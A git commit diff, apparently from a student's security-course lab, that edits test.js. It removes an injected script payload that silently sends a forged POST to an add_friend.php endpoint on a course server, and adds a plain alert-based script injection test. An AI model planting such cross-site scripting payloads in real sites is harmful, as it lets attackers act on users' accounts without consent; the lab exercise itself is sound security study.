7bddd4527adb540389f1a01904f78aaab80b8b76
mjp2960 <55259226+mjp2960@users.noreply.github.com>
2021-12-15 15:46:26 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,1 @@
-<script> 
-	alert(2);
-	var addFriend = new XMLHttpRequest(); 
-	
-	addFriend.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=118', true);
-	addFriend.setRequestHeader('Content-type', 'application/x-www-form-urlendcoded'); 
-	addFriend.send();
-</script>
+<script> alert(3); </script>
